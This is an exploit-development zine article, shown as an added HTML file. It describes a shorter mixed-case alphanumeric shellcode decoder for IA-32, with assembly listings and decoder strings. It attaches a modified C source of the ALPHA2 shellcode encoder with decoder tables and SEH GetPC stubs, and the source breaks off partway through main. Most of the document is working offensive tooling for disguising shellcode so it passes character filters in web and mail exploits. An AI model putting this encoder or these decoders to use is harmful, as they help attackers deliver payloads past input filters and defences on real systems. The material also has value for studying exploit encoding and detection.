@@ -1,0 +1,533 @@
+﻿<html>
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>An improvement on mixed case alphanumeric shellcode decoder</title>
+</head>
+<body>
+<pre style="width: 100%; word-wrap:break-word;">
+                          ==Ph4nt0m Security Team==
+ 
+                       Issue 0x01, Phile #0x02 of 0x06
+ 
+
+|=---------------------------------------------------------------------------=|
+|=----=[ An improvement on mixed case alphanumeric shellcode decoder ]=------=|
+|=---------------------------------------------------------------------------=|
+|=---------------------------------------------------------------------------=|
+|=--------------------=[          By tms320            ]=--------------------=|
+|=--------------------=[  &lt;tms320_at_ph4nt0m_dot_org&gt;  ]=--------------------=|
+|=---------------------------------------------------------------------------=|
+ 
+
+A lot of exploits which used in exploiting Web or mail applications need 
+alphanumeric encoded shellcodes. The paper &#34;Writing ia32 alphanumeric shellcodes&#34; 
+presented on Phrack volume 11, issue 57 introduced to us on how to write an 
+alphanumeric encoded shellcode. Berend developed a tool named alpha2 to encode 
+any binary shellcode to alphanumeric encoded shellcode. A small trick can be 
+used to make mixed case alphanumeric shellcode decoder shorter, so that smaller
+shellcode can be generated.
+
+Let&#34;s have a clear look at Berend’ decoder 
+&#34;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0 BBABXP8ABuJI&#34;, which gives the 
+following assemble code:
+ 
+PUSH ESP
+POP ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+AAA
+PUSH ECX
+POP EDX
+PUSH 41
+POP EAX
+PUSH EAX
+XOR BYTE PTR DS:[ECX+30],AL
+INC ECX
+IMUL EAX,DWORD PTR DS:[ECX+41],51
+XOR AL,BYTE PTR DS:[ECX+42]
+XOR AL,BYTE PTR DS:[EDX+42]
+XOR BYTE PTR DS:[EDX+42],AL
+INC ECX
+INC EDX
+POP EAX
+PUSH EAX
+CMP BYTE PTR DS:[ECX+42],AL
+db 75h, 4Ah, 49H ;75 E9 JNZ   loop
+ 
+Here  &#34;IMUL EAX, [ECX+42],10h&#34; is use to shift first byte left 4 bits. Because 
+10h is not an alphanumeric code, &#34;XOR BYTE PTR DS:[ECX+30],AL&#34; is used to patch 
+it. Ecx points to the start of decoder, and smallest alphanumeric letter 30h is 
+used to avoid amount of padding nops.
+
+From a simple multiplication of 4h*4h=10h, we can know that shifting a byte left
+4 bits can be realized by multiplying 4h twice. Because 4h is still a 
+non-alphanumeric code, 34h, 44h, 54h, 64h, 74h can be used instead. By this way,
+xor instruction can be removed from decoder, and the first decoded instructions 
+can start from ecx+30h instead of original ecx+42h. So 12h bytes can be saved in
+non-compressed decoder, and 8h bytes saved in compressed decoder. Following is 
+the new decoder:
+
+TYIIIIIIQZAkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN
+
+PUSH ESP
+POP ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+DEC ECX
+PUSH ECX
+POP EDX
+INC ECX
+IMUL EAX,DWORD PTR DS:[ECX+30],44
+XOR AL,BYTE PTR DS:[ECX+30]
+XOR BYTE PTR DS:[ECX+30],AL
+IMUL EAX,DWORD PTR DS:[ECX+30],44
+XOR AL,BYTE PTR DS:[ECX+31]
+XOR AL,BYTE PTR DS:[EDX+31]
+XOR BYTE PTR DS:[EDX+31],AL
+INC ECX
+INC EDX
+PUSH 41
+POP EAX
+CMP BYTE PTR DS:[ECX+31],AL
+db 75h, 49h, 4Eh;75 DE JNZ   loop
+ 
+A modified alpha2 encoding program is attached at end of paper, and thanks to
+Berend, who shares the original code. If you have questions, please send mail 
+to tms320@ph4nt0m.org.
+
+
+The Shellcode Decoder:
+
+#include &lt;stdio.h&gt; // printf(), fprintf(), stderr
+#include &lt;stdlib.h&gt; // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()
+#include &lt;string.h&gt; // strcasecmp(), strstr()
+//#include &lt;time.h&gt; //struct timeval, struct timezone, gettimeofday()
+#include &lt;windows.h&gt;
+#define VERSION_STRING &quot;ALPHA 2: Zero-tolerance. (build 07)&quot;
+#define COPYRIGHT      &quot;Copyright (C) 2003, 2004 by Berend-Jan Wever.&quot;
+strcasecmp (const char * __sz1, const char * __sz2)
+{return _stricmp (__sz1, __sz2);}
+ 
+
+/*
+ ________________________________________________________________________________
+ 
+    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.
+    SS&quot;  Y$P&quot;  SY&quot;  ,SY
+   iS&#34;   dY       ,sS&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.
+   YS,  dSb    ,sY&quot;      Copyright (C) 2003, 2004 by Berend-Jan Wever.
+   `&quot;YSS&#34;&quot;S&#34; &#34;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;
+ ________________________________________________________________________________
+ 
+  This program is free software; you can redistribute it and/or modify it under
+   the terms of the GNU General Public License version 2, 1991 as published by
+   the Free Software Foundation.
+ 
+  This program is distributed in the hope that it will be useful, but WITHOUT
+   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+   FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
+   details.
+ 
+  A copy of the GNU General Public License can be found at:
+     http://www.gnu.org/licenses/gpl.html
+   or you can write to:
+     Free Software Foundation, Inc.
+     59 Temple Place - Suite 330
+     Boston, MA  02111-1307
+     USA.
+ 
+Acknowledgements:
+   Thanks to rix for his phrack article on aphanumeric shellcode.
+   Thanks to obscou for his phrack article on unicode-proof shellcode.
+   Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.
+   Thanks to spoonm for inspiration and suggestions, check out his 1337 perl
+             conversion of ALPHA in the metasploit framework (with polymorphism!)
+ */
+ 
+#define mixedcase_w32sehgetpc           &quot;VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36&quot; \
+                                         &quot;FFFFTXVj0PPTUPPa301089&quot;
+ #define uppercase_w32sehgetpc           &quot;VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY&quot; \
+                                         &quot;P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618&quot; \
+                                         &quot;16&quot;
+ #define mixedcase_ascii_decoder_body    &quot;AkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN&quot;
+ #define uppercase_ascii_decoder_body    &quot;VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B&quot; \
+                                         &quot;BXP8ACJJI&quot;
+ #define mixedcase_unicode_decoder_body  &quot;jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA&quot; \
+                                         &quot;IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA&quot; \
+                                         &quot;ZBABABABABkMAGB9u4JB&quot;
+ #define uppercase_unicode_decoder_body  &quot;QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5&quot; \
+                                         &quot;AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB&quot; \
+                                         &quot;QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3&quot; \
+                                         &quot;0APB944JB&quot;
+ 
+struct decoder {
+   char* id; // id of option
+   char* code; // the decoder
+ } mixedcase_ascii_decoders[] = {
+   { &quot;nops&quot;,     &quot;IIIIIIII&quot; mixedcase_ascii_decoder_body },
+   { &quot;eax&quot;,      &quot;PYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;ecx&quot;,      &quot;IIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;edx&quot;,      &quot;JJJJJJJRY&quot; mixedcase_ascii_decoder_body },
+   { &quot;ebx&quot;,      &quot;SYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;esp&quot;,      &quot;TYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;ebp&quot;,      &quot;UYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;esi&quot;,      &quot;VYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;edi&quot;,      &quot;WYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-10]&quot;, &quot;LLLLLLLLTLLLLYQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-8]&quot;,  &quot;LLLLLLLLYII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-4]&quot;,  &quot;LLLLYIIII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YIIIIII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YYIIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+8]&quot;,  &quot;YYYIIIII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+C]&quot;,  &quot;YYYYIIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+10]&quot;, &quot;YYYYYIIII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+14]&quot;, &quot;YYYYYYIIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+18]&quot;, &quot;YYYYYYYIII7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;IIIIIIIQZ&quot; // ecx code
+                 mixedcase_ascii_decoder_body },
+   { NULL, NULL }
+ }, uppercase_ascii_decoders[] = {
+   { &quot;nops&quot;,     &quot;IIIIIIIIIIII&quot; uppercase_ascii_decoder_body },
+   { &quot;eax&quot;,      &quot;PYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;ecx&quot;,      &quot;IIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;edx&quot;,      &quot;JJJJJJJJJJJRY&quot; uppercase_ascii_decoder_body },
+   { &quot;ebx&quot;,      &quot;SYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;esp&quot;,      &quot;TYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;ebp&quot;,      &quot;UYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;esi&quot;,      &quot;VYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;edi&quot;,      &quot;WYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLYIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-8]&quot;,  &quot;LLLLLLLLYIIIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-4]&quot;,  &quot;LLLL7YIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YIIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+8]&quot;,  &quot;YYYIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+C]&quot;,  &quot;YYYYIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIII7QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIQZ&quot; uppercase_ascii_decoder_body },
+   { &quot;seh&quot;,      uppercase_w32sehgetpc &quot;IIIIIIIIIIIQZ&quot; // ecx code
+                 uppercase_ascii_decoder_body },
+   { NULL, NULL }
+ }, mixedcase_ascii_nocompress_decoders[] = {
+   { &quot;nops&quot;,     &quot;7777777777777777&quot; mixedcase_ascii_decoder_body },
+   { &quot;eax&quot;,      &quot;PY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;ecx&quot;,      &quot;77777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;edx&quot;,      &quot;77777777777777RY&quot; mixedcase_ascii_decoder_body },
+   { &quot;ebx&quot;,      &quot;SY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;esp&quot;,      &quot;TY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;ebp&quot;,      &quot;UY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;esi&quot;,      &quot;VY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;edi&quot;,      &quot;WY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-10]&quot;, &quot;LLLLLLLLTLLLLYQZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY7QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-8]&quot;,  &quot;LLLLLLLLY77777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp-4]&quot;,  &quot;LLLL7Y77777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp]&quot;,    &quot;Y7777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YY777777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+8]&quot;,  &quot;YYY77777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+C]&quot;,  &quot;YYYY7777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+10]&quot;, &quot;YYYYY777777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+14]&quot;, &quot;YYYYYY77777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+18]&quot;, &quot;YYYYYYY7777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;[esp+1C]&quot;, &quot;YYYYYYYY777777QZ&quot; mixedcase_ascii_decoder_body },
+   { &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;77777777777777QZ&quot; // ecx code
+                 mixedcase_ascii_decoder_body },
+   { NULL, NULL }
+ }, uppercase_ascii_nocompress_decoders[] = {
+   { &quot;nops&quot;,     &quot;777777777777777777777777&quot; uppercase_ascii_decoder_body },
+   { &quot;eax&quot;,      &quot;PY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;ecx&quot;,      &quot;7777777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;edx&quot;,      &quot;7777777777777777777777RY&quot; uppercase_ascii_decoder_body },
+   { &quot;ebx&quot;,      &quot;SY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;esp&quot;,      &quot;TY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;ebp&quot;,      &quot;UY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;esi&quot;,      &quot;VY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;edi&quot;,      &quot;WY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY77777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-8]&quot;,  &quot;LLLLLLLLY7777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp-4]&quot;,  &quot;LLLL7Y7777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp]&quot;,    &quot;Y777777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YY77777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+8]&quot;,  &quot;YYY7777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+C]&quot;,  &quot;YYYY777777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+10]&quot;, &quot;YYYYY77777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+14]&quot;, &quot;YYYYYY7777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+18]&quot;, &quot;YYYYYYY777777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;[esp+1C]&quot;, &quot;YYYYYYYY77777777777777QZ&quot; uppercase_ascii_decoder_body },
+   { &quot;seh&quot;,      uppercase_w32sehgetpc &quot;7777777777777777777777QZ&quot; // ecx code
+                 uppercase_ascii_decoder_body },
+   { NULL, NULL }
+ }, mixedcase_unicode_decoders[] = {
+   { &quot;nops&quot;,     &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body },
+   { &quot;eax&quot;,      &quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;ecx&quot;,      &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body },
+   { &quot;edx&quot;,      &quot;RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;ebx&quot;,      &quot;SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;esp&quot;,      &quot;TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;ebp&quot;,      &quot;UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;esi&quot;,      &quot;VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;edi&quot;,      &quot;WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44&quot; mixedcase_unicode_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body },
+   { NULL, NULL }
+ }, uppercase_unicode_decoders[] = {
+   { &quot;nops&quot;,     &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body },
+   { &quot;eax&quot;,      &quot;PPYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;ecx&quot;,      &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body },
+   { &quot;edx&quot;,      &quot;RRYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;ebx&quot;,      &quot;SSYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;esp&quot;,      &quot;TUYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;ebp&quot;,      &quot;UUYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;esi&quot;,      &quot;VVYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;edi&quot;,      &quot;WWYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YAIAIAIAIA44&quot; uppercase_unicode_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIA&quot; uppercase_unicode_decoder_body },
+   { NULL, NULL }
+ }, mixedcase_unicode_nocompress_decoders[] = {
+   { &quot;nops&quot;,     &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;eax&quot;,      &quot;PPYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;ecx&quot;,      &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;edx&quot;,      &quot;RRYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;ebx&quot;,      &quot;SSYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;esp&quot;,      &quot;TUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;ebp&quot;,      &quot;UUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;esi&quot;,      &quot;VVYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;edi&quot;,      &quot;WWYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YA4444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body },
+   { NULL, NULL }
+ }, uppercase_unicode_nocompress_decoders[] = {
+   { &quot;nops&quot;,     &quot;44444444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;eax&quot;,      &quot;PPYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;ecx&quot;,      &quot;44444444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;edx&quot;,      &quot;RRYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;ebx&quot;,      &quot;SSYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;esp&quot;,      &quot;TUYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;ebp&quot;,      &quot;UUYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;esi&quot;,      &quot;VVYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;edi&quot;,      &quot;WWYA4444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;[esp]&quot;,    &quot;YA444444444444&quot; uppercase_unicode_decoder_body },
+   { &quot;[esp+4]&quot;,  &quot;YUYA4444444444&quot; uppercase_unicode_decoder_body },
+   { NULL, NULL }
+ };
+ 
+struct decoder* decoders[] = {
+   mixedcase_ascii_decoders, uppercase_ascii_decoders,
+   mixedcase_unicode_decoders, uppercase_unicode_decoders,
+   mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,
+   mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders
+ };
+ void version(void) {
+   printf(
+     &quot;________________________________________________________________________________\n&quot;
+     &quot;\n&quot;
+     &quot;    ,sSSs,,s,  ,sSSSs,  &quot; VERSION_STRING &quot;\n&quot;
+     &quot;   SS\&quot;  Y$P\&quot;  SY\&quot;  ,SY \n&quot;
+     &quot;  iS&#34;   dY       ,sS\&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.\n&quot;
+     &quot;  YS,  dSb    ,sY\&quot;      &quot; COPYRIGHT &quot;\n&quot;
+     &quot;  `\&quot;YSS&#34;\&quot;S&#34; &#34;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;\n&quot;
+     &quot;________________________________________________________________________________\n&quot;
+     &quot;\n&quot;
+   );
+   exit(EXIT_SUCCESS);
+ }
+ 
+void help(char* name) {
+   printf(
+     &quot;Usage: %s [OPTION] [BASEADDRESS]\n&quot;
+     &quot;ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n&quot;
+     &quot;The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\n&quot;
+     &quot;version of your origional shellcode. It consists of baseaddress-code with some\n&quot;
+     &quot;padding, a decoder routine and the encoded origional shellcode. This will work\n&quot;
+     &quot;for any target OS. The resulting shellcode needs to have RWE-access to modify\n&quot;
+     &quot;it&#34;s own code and decode the origional shellcode in memory.\n&quot;
+     &quot;\n&quot;
+     &quot;BASEADDRESS\n&quot;
+     &quot;  The decoder routine needs have it&#34;s baseaddress in specified register(s). The\n&quot;
+     &quot;  baseaddress-code copies the baseaddress from the given register or stack\n&quot;
+     &quot;  location into the apropriate registers.\n&quot;
+     &quot;eax, ecx, edx, ebx, esp, ebp, esi, edi\n&quot;
+     &quot;  Take the baseaddress from the given register. (Unicode baseaddress code using\n&quot;
+     &quot;  esp will overwrite the byte of memory pointed to by ebp!)\n&quot;
+     &quot;[esp], [esp-X], [esp+X]\n&quot;
+     &quot;  Take the baseaddress from the stack.\n&quot;
+     &quot;seh\n&quot;
+     &quot;  The windows \&quot;Structured Exception Handler\&quot; (seh) can be used to calculate\n&quot;
+     &quot;  the baseaddress automatically on win32 systems. This option is not available\n&quot;
+     &quot;  for unicode-proof shellcodes and the uppercase version isn&#34;t 100%% reliable.\n&quot;
+     &quot;nops\n&quot;
+     &quot;  No baseaddress-code, just padding.  If you need to get the baseaddress from a\n&quot;
+     &quot;  source not on the list use this option (combined with --nocompress) and\n&quot;
+     &quot;  replace the nops with your own code. The ascii decoder needs the baseaddress\n&quot;
+     &quot;  in registers ecx and edx, the unicode-proof decoder only in ecx.\n&quot;
+     &quot;-n\n&quot;
+     &quot;  Do not output a trailing newline after the shellcode.\n&quot;
+     &quot;--nocompress\n&quot;
+     &quot;  The baseaddress-code uses \&quot;dec\&quot;-instructions to lower the required padding\n&quot;
+     &quot;  length. The unicode-proof code will overwrite some bytes in front of the\n&quot;
+     &quot;  shellcode as a result. Use this option if you do not want the \&quot;dec\&quot;-s.\n&quot;
+     &quot;--unicode\n&quot;
+     &quot;  Make shellcode unicode-proof. This means it will only work when it gets\n&quot;
+     &quot;  converted to unicode (inserting a &#34;0&#34; after each byte) before it gets\n&quot;
+     &quot;  executed.\n&quot;
+     &quot;--uppercase\n&quot;
+     &quot;  Make shellcode 100%% uppercase characters, uses a few more bytes then\n&quot;
+     &quot;  mixedcase shellcodes.\n&quot;
+     &quot;--sources\n&quot;
+     &quot;  Output a list of BASEADDRESS options for the given combination of --uppercase\n&quot;
+     &quot;  and --unicode.\n&quot;
+     &quot;--help\n&quot;
+     &quot;  Display this help and exit\n&quot;
+     &quot;--version\n&quot;
+     &quot;  Output version information and exit\n&quot;
+     &quot;\n&quot;
+     &quot;See the source-files for further details and copying conditions. There is NO\n&quot;
+     &quot;warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n&quot;
+     &quot;\n&quot;
+     &quot;Acknowledgements:\n&quot;
+     &quot;  Thanks to rix for his phrack article on aphanumeric shellcode.\n&quot;
+     &quot;  Thanks to obscou for his phrack article on unicode-proof shellcode.\n&quot;
+     &quot;  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n&quot;
+     &quot;\n&quot;
+     &quot;Report bugs to &lt;skylined@edup.tudelft.nl&gt;\n&quot;,
+     name
+   );
+   exit(EXIT_SUCCESS);
+ }
+ 
+//-----------------------------------------------------------------------------
+ int main(int argc, char* argv[], char* envp[]) {
+   int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,
+         nonewline = 0, nocompress = 0, options = 0, spaces = 0;
+   char* baseaddress = NULL;
+   int   i, input, A, B, C, D, E, F;
+   char* valid_chars;
+ 
+  // Random seed
+   //struct timeval tv;
+   //struct timezone tz;
+   //gettimeofday(&amp;tv, &amp;tz);
+   //srand((int)tv.tv_sec*1000+tv.tv_usec);
+    srand((unsigned int)GetTickCount());
+   // Scan all the options and set internal variables accordingly
+   for (i=1; i&lt;argc; i++) {
+          if (strcmp(argv[i], &quot;--help&quot;) == 0) help(argv[0]);
+     else if (strcmp(argv[i], &quot;--version&quot;) == 0) version();
+     else if (strcmp(argv[i], &quot;--uppercase&quot;) == 0) uppercase = 1;
+     else if (strcmp(argv[i], &quot;--unicode&quot;) == 0) unicode = 1;
+     else if (strcmp(argv[i], &quot;--nocompress&quot;) == 0) nocompress = 1;
+     else if (strcmp(argv[i], &quot;--sources&quot;) == 0) sources = 1;
+     else if (strcmp(argv[i], &quot;--spaces&quot;) == 0) spaces = 1;
+     else if (strcmp(argv[i], &quot;-n&quot;) == 0) nonewline = 1;
+     else if (baseaddress == NULL) baseaddress = argv[i];
+     else {
+       fprintf(stderr, &quot;%s: more then one BASEADDRESS option: `%s&#34; and `%s&#34;\n&quot;
+                       &quot;Try `%s --help&#34; for more information.\n&quot;,
+                       argv[0], baseaddress, argv[i], argv[0]);
+       exit(EXIT_FAILURE);
+     }
+   }
+ 
+  // No baseaddress option ?
+   if (baseaddress == NULL) {
+     fprintf(stderr, &quot;%s: missing BASEADDRESS options.\n&quot;
+                     &quot;Try `%s --help&#34; for more information.\n&quot;, argv[0], argv[0]);
+     exit(EXIT_FAILURE);
+   }
+   // The uppercase, unicode and nocompress option determine which decoder we&#34;ll
+   // need to use. For each combination of these options there is an array,
+   // indexed by the baseaddress with decoders. Pointers to these arrays have
+   // been put in another array, we can calculate the index into this second
+   // array like this:
+   options = uppercase+unicode*2+nocompress*4;
+   // decoders[options] will now point to an array of decoders for the specified
+   // options. The array contains one decoder for every possible baseaddress.
+ 
+  // Someone wants to know which baseaddress options the specified options
+   // for uppercase, unicode and/or nocompress allow:
+   if (sources) {
+     printf(&quot;Available options for %s%s alphanumeric shellcode:\n&quot;,
+            uppercase ? &quot;uppercase&quot; : &quot;mixedcase&quot;,
+            unicode ? &quot; unicode-proof&quot; : &quot;&quot;);
+     for (i=0; decoders[options][i].id != NULL; i++) {
+       printf(&quot;  %s\n&quot;, decoders[options][i].id);
+     }
